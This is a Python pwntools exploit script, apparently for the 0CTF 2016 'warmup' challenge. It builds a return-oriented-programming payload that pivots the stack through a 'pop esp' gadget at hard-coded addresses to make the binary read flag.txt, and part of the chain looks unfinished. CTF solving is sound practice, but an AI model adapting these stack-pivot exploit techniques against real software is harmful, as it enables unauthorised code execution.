#!/usr/bin/python

from pwn import *

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.send(line)
	with open('payload', 'a') as f:
		f.write(line)

def sendline(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.sendline(line)
	with open('payload', 'a') as f:
		f.write(line + '\x0a')

context.clear(arch='i386')
context.kernel = 'i386'
context.bits = 32

binary = elf.ELF('./warmup')
conn = process('./warmup')
flag_str = "./flag.txt"
padding = "A"*(4*8 - len(flag_str))
payload = padding + flag_str
flag_addr = 0xffffd030
string_addr = 0xffffd01c

binary.symbols = {
	'read'		: 0x804811D ,
	'write' 	: 0x8048135 ,
	'exit' 		: 0x804814D ,
	'pop_esp'	: 0x08048113, # pop esp ; and al, 4 ; int 0x80
	'welcome' 	: 0x80491BC , #'Welcome to 0CTF 2016!'
	'goodluck' 	: 0x80491D3   #'Good Luck!'
}
rop1 = ROP(binary) # first rop
rop2 = ROP(binary) # after shift

# rop1.write(0x1, binary.symbols['welcome'], len('Welcome to 0CTF 2016!\n'))
rop1.raw(binary.symbols['pop_esp']) # make esp point to our string
rop1.raw(string_addr) # make esp point to our string

print rop1.dump()



payload = str(rop2) + "A"*(8*4 - len(str(rop2)) - len(flag_str)) + flag_str + str(rop1)

send(conn, payload)
print conn.recv()

